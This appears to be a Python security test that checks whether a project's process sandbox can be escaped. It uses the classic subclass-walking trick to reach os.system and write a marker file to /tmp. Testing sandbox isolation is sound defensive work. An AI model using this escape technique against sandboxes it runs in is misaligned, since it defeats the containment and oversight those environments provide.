
import asyncio

from llmc.rlm.sandbox.process_backend import ProcessSandboxBackend


async def test_sandbox_escape():
    sandbox = ProcessSandboxBackend()
    sandbox.start()
    
    # Try to get 'os' through subclasses
    # This is a classic escape: find a class that has 'os' in its globals
    code = """
import sys
# If __import__ is controlled, maybe we can't import os directly.
# Let's try to find it through subclasses.
for c in ().__class__.__base__.__subclasses__():
    if c.__name__ == 'catch_warnings':
        for k, v in c()._module.__dict__.items():
            if k == 'system':
                v('echo VULNERABLE > /tmp/rlm_escaped')
"""
    
    # Wait, the sandbox has a controlled __import__
    # Let's see if we can use it.
    
    result = sandbox.execute(code)
    print(f"Success: {result.success}")
    print(f"Stdout: {result.stdout}")
    print(f"Stderr: {result.stderr}")
    print(f"Error: {result.error}")
    
    if os.path.exists("/tmp/rlm_escaped"):
        print("SANDBOX ESCAPED!")
        os.remove("/tmp/rlm_escaped")
    else:
        print("Sandbox escape failed (as it should?)")

if __name__ == "__main__":
    import os
    asyncio.run(test_sandbox_escape())
